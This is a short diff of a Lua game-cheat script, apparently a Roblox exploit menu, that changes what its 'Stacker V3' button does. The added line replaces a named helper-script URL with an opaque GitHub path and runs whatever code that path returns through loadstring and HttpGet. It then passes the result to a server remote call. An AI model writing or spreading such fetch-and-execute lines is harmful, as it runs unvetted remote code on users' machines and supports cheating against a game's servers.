@@ -482,7 +482,7 @@ end)
 local Script = Script:NewSection("Scripts")
 Stack:NewButton("Stacker V3", "Upgrader", function(txt)
 	local args = {
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/TacoCatBackWardsIsTacoCat/scripts/main/TDS%20Auto%20Medic.lua",true))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/rrAsus/b/main/b.lua",true))()
 	}
 	game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
 end)
